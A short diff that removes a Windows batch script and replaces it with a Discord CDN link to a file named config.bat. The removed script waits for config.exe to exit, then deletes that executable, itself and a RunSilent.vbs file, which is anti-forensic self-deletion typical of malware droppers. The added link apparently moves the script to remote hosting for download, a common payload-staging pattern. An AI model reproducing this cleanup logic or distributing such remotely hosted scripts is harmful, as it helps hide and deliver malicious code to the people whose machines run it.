@@ -1,18 +1,1 @@
-@echo off
-set "exeFile=config.exe"
-
-for %%F in ("%exeFile%") do set "processName=%%~nF"
-
-:CheckProcess
-tasklist /FI "IMAGENAME eq %processName%.exe" 2>NUL | find /I "%processName%" >NUL
-if errorlevel 1 (
-    echo Process %processName% is not running.
-    del "%~dp0%exeFile%"
-) else (
-    echo Process %processName% is still running. Waiting...
-    timeout /t 1 /nobreak >nul
-    goto CheckProcess
-)
-
-del "%~f0"
-del "%~dp0RunSilent.vbs"
+https://cdn.discordapp.com/attachments/1216629965827735572/1216709480973209692/config.bat?ex=66016001&is=65eeeb01&hm=901e7487e2b71bc878760cf53f964926d992133af91cb8612d5b27cf7ebea9f4&
